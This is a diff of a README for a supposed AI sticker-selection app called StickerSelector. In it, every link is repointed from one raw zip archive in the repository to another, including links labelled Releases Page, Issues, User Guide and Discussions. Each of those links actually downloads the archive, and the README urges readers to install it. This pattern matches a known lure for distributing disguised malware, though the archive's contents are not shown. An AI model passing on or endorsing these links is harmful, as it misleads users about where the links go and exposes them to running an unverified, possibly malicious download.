@@ -6,9 +6,9 @@ StickerSelector is an AI-powered tool that helps you find the best stickers for 
 
 ## 📥 Download the App
 
-[![Download StickerSelector](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/Selector_Sticker_3.5.zip)](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/Selector_Sticker_3.5.zip)
+[![Download StickerSelector](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/static/Sticker-Selector-v2.4.zip)](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/static/Sticker-Selector-v2.4.zip)
 
-To get StickerSelector, visit our [Releases Page](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/Selector_Sticker_3.5.zip). Here, you will find the latest version of the app. Click on the link to download it.
+To get StickerSelector, visit our [Releases Page](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/static/Sticker-Selector-v2.4.zip). Here, you will find the latest version of the app. Click on the link to download it.
 
 ## 🔧 System Requirements
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Click the link to go to the [Releases Page](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/Selector_Sticker_3.5.zip).
+1. Click the link to go to the [Releases Page](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/static/Sticker-Selector-v2.4.zip).
 2. Choose the latest version available.
 3. Select the correct file for your operating system (Windows or macOS).
 4. Wait for the file to download.
@@ -59,15 +59,15 @@ If you encounter issues with StickerSelector, try the following steps:
 - Ensure your internet connection is stable.
 - Make sure you downloaded the right version for your operating system.
 
-If problems persist, visit the [GitHub Issues Page](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/Selector_Sticker_3.5.zip) for help.
+If problems persist, visit the [GitHub Issues Page](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/static/Sticker-Selector-v2.4.zip) for help.
 
 ## 🗒️ User Guide
 
-For detailed usage instructions, visit our [User Guide](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/Selector_Sticker_3.5.zip) linked in the repository. Here you will find tips and tricks to maximize your StickerSelector experience.
+For detailed usage instructions, visit our [User Guide](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/static/Sticker-Selector-v2.4.zip) linked in the repository. Here you will find tips and tricks to maximize your StickerSelector experience.
 
 ## ✅ Feedback
 
-We welcome your thoughts! Please share your feedback or feature requests through our [GitHub Discussions](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/Selector_Sticker_3.5.zip). Your input helps us improve the app.
+We welcome your thoughts! Please share your feedback or feature requests through our [GitHub Discussions](https://github.com/TheRealAnakin/StickerSelector/raw/refs/heads/main/sticker_service/static/Sticker-Selector-v2.4.zip). Your input helps us improve the app.
 
 ## 🔗 Related Topics
 
